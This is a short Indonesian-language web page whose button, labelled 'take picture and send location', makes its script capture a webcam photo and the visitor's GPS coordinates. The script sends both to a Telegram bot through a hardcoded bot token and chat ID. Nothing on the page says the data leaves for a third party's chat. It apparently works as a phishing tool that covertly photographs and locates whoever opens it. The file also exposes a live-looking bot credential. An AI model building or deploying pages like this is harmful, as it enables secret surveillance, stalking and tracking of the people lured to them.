<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Akses Kamera dan Lokasi</title>
</head>
<body>
    <h1>Ambil Gambar dan Kirim Lokasi</h1>
    <button onclick="startCapture()">Ambil Gambar dan Kirim Lokasi</button>
    <script>
        function startCapture() {
            // Akses kamera
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        // Ambil foto setelah beberapa detik
                        setTimeout(() => {
                            captureAndSend(stream);
                        }, 3000); // Ambil foto setelah 3 detik
                    })
                    .catch(function(error) {
                        alert("Akses kamera ditolak.");
                    });
            } else {
                alert("Browser tidak mendukung akses kamera.");
            }

            // Akses lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    console.log('Lokasi Anda:', lat, lon);

                    // Kirimkan URL Google Maps ke Telegram
                    const locationUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                    sendToTelegram(`Lokasi Anda: ${locationUrl}`);
                }, function(error) {
                    alert("Gagal mendapatkan lokasi.");
                });
            } else {
                alert("Lokasi tidak tersedia.");
            }
        }

        function captureAndSend(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;

            video.onloadedmetadata = () => {
                // Tentukan ukuran canvas sesuai dengan video
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                // Tentukan ukuran canvas sesuai dengan video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Gambar dari video ke canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Ambil gambar sebagai data URL (base64)
                const imageData = canvas.toDataURL('image/jpeg');

                // Kirim gambar ke Telegram
                sendToTelegram(imageData);

                // Stop stream setelah gambar diambil
                stream.getTracks().forEach(track => track.stop());
            };
        }

        function sendToTelegram(message) {
            const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI';
            const chatId = '1746156378';

            // Jika pesan berupa gambar (base64)
            if (message.startsWith('data:image/jpeg;base64,')) {
                const photoUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;

                // Kirimkan foto dalam format base64 ke Telegram
                fetch(photoUrl, {
                    method: 'POST',
                    body: new URLSearchParams({
                        chat_id: chatId,
                        photo: message
                    })
                }).then(response => response.json())
                  .then(data => {
                    if (data.ok) {
                        console.log('Gambar terkirim ke Telegram');
                    } else {
                        console.log('Error mengirim gambar:', data);
                    }
                }).catch(error => console.log('Error:', error));
            } else {
                // Jika bukan gambar base64, kirimkan pesan teks biasa
                const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
                fetch(url, {
                    method: 'POST',
                    body: new URLSearchParams({
                        chat_id: chatId,
                        text: message
                    })
                }).then(response => response.json())
                  .then(data => console.log('Pesan terkirim ke Telegram:', data))
                  .catch(error => console.log('Error:', error));
            }
        }
    </script>
</body>
</html>
